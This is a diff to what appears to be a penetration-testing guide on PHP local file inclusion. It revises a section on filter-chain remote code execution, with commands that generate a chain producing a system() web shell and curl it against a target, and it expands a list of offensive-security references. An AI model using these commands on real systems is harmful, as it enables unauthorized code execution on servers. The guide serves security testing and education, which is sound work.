@@ -326,11 +326,14 @@ If the sink **includes** files and you can write attacker text into a log the se
 
 Modern, file-write-free RCE: chain PHP filters to **synthesize arbitrary PHP bytes** from `php://filter` and have the include execute them — works even with `allow_url_include=Off` and no writable file.
 ```
-Tooling: poc/filter_chain_rce.py  (or synacktiv's php_filter_chain_generator.py)
+Tooling: poc/filter_chain_rce.py  — DRIVES synacktiv's php_filter_chain_generator.py (auto-detected in the poc dir /
+         PATH, or pass --generator <path>); a byte-correct chain needs synacktiv's iconv table, so the poc wraps it
+         rather than ship an incomplete one.
 What it does: builds a long php://filter/.../resource=... that, when included, produces e.g. <?php system($_GET[c]);?>
 Use it:
-  python3 poc/filter_chain_rce.py --cmd 'id' > chain.txt        # prints the filter chain
-  curl -s "https://target/?page=$(cat chain.txt)&c=id"          # include it → RCE
+  python3 poc/filter_chain_rce.py --cmd id             # runs the generator → prints the chain (copy the php://filter line)
+  # one-time setup if not found:  git clone https://github.com/synacktiv/php_filter_chain_generator && cp .../php_filter_chain_generator.py poc/
+  curl -s "https://target/?page=<URL-ENCODED-CHAIN>&c=id"       # include it → RCE
 ```
 > **If this → then that:** PHP **include** sink but no log access, no upload, `allow_url_include=Off` → the **filter-chain** is your RCE: it needs only the single LFI parameter and no writable location. It's the go-to modern technique when log/session poisoning is unavailable. (Generate the chain with the bundled script.)
 
@@ -678,15 +681,41 @@ ALWAYS: escalate past /etc/passwd; prove RCE with a benign marker; CLEAN UP; rep
 
 # Appendix C — Important Links
 
+**Always-on core (every kit):**
 ```
-PortSwigger — File path traversal                    https://portswigger.net/web-security/file-path-traversal
-PortSwigger — LFI / wrappers                          https://portswigger.net/web-security/file-inclusion
+PortSwigger — File path traversal (+ labs)            https://portswigger.net/web-security/file-path-traversal
+PortSwigger — File inclusion / LFI (+ labs)           https://portswigger.net/web-security/file-inclusion
+PortSwigger Research                                  https://portswigger.net/research
 PayloadsAllTheThings — File Inclusion                 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
-php_filter_chain_generator (filter-chain RCE)         https://github.com/synacktiv/php_filter_chain_generator
-LFISuite / liffy / Kadimus (LFI→RCE)                  https://github.com/D35m0nd142/LFISuite
-SecLists — LFI/Traversal wordlists                    https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
-HackTricks — LFI/RFI                                  https://book.hacktricks.xyz/pentesting-web/file-inclusion
-CWE-98 (PHP inclusion) / CWE-22 (traversal)           https://cwe.mitre.org/data/definitions/98.html
+PayloadsAllTheThings — Directory Traversal            https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
+HackTricks — File Inclusion / LFI2RCE                 https://book.hacktricks.xyz/pentesting-web/file-inclusion
+The Hacker Recipes — File inclusion / path traversal  https://www.thehacker.recipes/web/inputs/file-inclusion
+OWASP WSTG — Testing for LFI / Directory Traversal    https://owasp.org/www-project-web-security-testing-guide/
+PentesterLab — File inclusion / traversal exercises   https://pentesterlab.com/
+SecLists — LFI / Traversal wordlists                  https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
+```
+
+**Class-specific research & tradecraft (filter-chain RCE §12 · server-level traversal §16.3 · wrappers):**
+```
+loknop — "PHP filter chains: file read from error-based oracle" (the ORIGINAL filter-chain technique)
+                                                      https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d
+Synacktiv — "PHP filter chains" deep-dive + php_filter_chain_generator (the §12 RCE tool)
+     https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle
+     https://github.com/synacktiv/php_filter_chain_generator
+Orange Tsai — "Breaking Parser Logic!" (reverse-proxy / path-normalization traversal, §16.3)   https://blog.orange.tw/
+Assetnote — Apache CVE-2021-41773 / 42013 path-traversal deep-dives                            https://blog.assetnote.io/
+Sam Thomas (Secarma) — phar:// deserialization, "…PHP Unserialization…" (Black Hat 2018)
+     https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf
+LFISuite / liffy / Kadimus (automated LFI->RCE — verify by hand)   https://github.com/D35m0nd142/LFISuite
+Real CVEs / writeups: Apache 2.4.49/50 · GitLab CVE-2023-2825 (unauth arbitrary read) · nginx `alias`
+     off-by-slash · pearcmd.php LFI->RCE                https://nvd.nist.gov/
+```
+
+**Standards & scoring:**
+```
+CWE-98 (PHP file inclusion) · CWE-22 (path traversal) · CWE-73 (external filename) · CWE-94 (code exec)
+                                                      https://cwe.mitre.org/data/definitions/98.html
+CVSS 3.1 calculator                                   https://www.first.org/cvss/calculator/3.1
 ```
 
 ---
